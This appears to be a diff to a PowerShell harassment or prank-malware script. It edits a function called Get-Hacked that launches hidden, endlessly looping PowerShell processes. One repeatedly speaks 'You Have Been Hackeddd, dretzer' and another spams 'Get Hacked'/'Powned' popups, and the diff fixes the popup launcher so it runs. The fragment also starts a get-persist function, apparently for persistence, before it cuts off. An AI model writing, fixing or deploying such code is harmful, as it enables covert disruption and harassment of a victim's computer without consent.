@@ -14,8 +14,10 @@ function Stop-bullshit {
 }
 
 function Get-Hacked {
-    start-process powershell -WindowStyle hidden -ArgumentList '-WindowStyle hidden -command "Add-Type -AssemblyName System.speech; while ($true) { (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''You Have Been Hackeddd, dretzer'') }"'
-    start-process powershell -WindowStyle hidden -ArgumentList $(while(1){(New-Object -ComObject wscript.shell).Popup("Get Hacked",0,"Powned",0x1)}) 
+    start-process powershell -WindowStyle hidden -ArgumentList '-WindowStyle hidden -command "Add-Type -AssemblyName System.speech; while (1) { (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''You Have Been Hackeddd, dretzer'') }"'
+    start-process powershell -WindowStyle Hidden -ArgumentList @'
+while(1){(New-Object -ComObject wscript.shell).Popup($('Get Hacked'),0,$('Powned'),0x1)};sleep(1000) 
+'@
 }
 function get-persist {
     Add-Content -Value @'
